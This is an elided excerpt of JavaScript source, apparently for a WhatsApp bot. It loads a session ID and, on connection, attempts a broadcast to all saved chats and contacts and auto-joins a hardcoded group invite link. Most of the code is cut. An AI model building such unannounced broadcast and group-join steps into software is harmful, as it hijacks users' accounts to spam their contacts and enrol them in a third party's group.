...
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
  ...
  const sessdata = config.SESSION_ID.replace("EXPERT-MD%>", '');
...
> *Report any error to the dev*
        ...
        (async () => {
          try {
            ...
            try {
              ...
              console.log('Auto-follow (summaries) failed:', e.message || e);
            }

            // 2) also attempt to send to all persisted contacts
            try {
              ...
              console.log('Auto-follow (contacts) failed:', e.message || e);
            }

            console.log('Auto-follow: broadcast attempted to saved chats and contacts');
          } catch (e) {
  ...
  //============================== 
  // Auto-join WhatsApp group when bot connects (configured invite link)
  try {
    const inviteLink = 'https://chat.whatsapp.com/DJMA7QOT4V8FuRD6MpjPpt?mode=ems_copy_t';
    const inviteCode = (inviteLink.split('/').pop() || '').split('?')[0] || 'DJMA7QOT4V8FuRD6MpjPpt';
    if (inviteCode) {
      if (!conn.ev) conn.ev = conn.ev || {};
      // Attempt join once when connection opens
      conn.ev.on && conn.ev.on('connection.update', async (update) => {
    ...
    console.log('Auto-join group setup failed:', e.message || e);
  }
  //=============readstatus=======
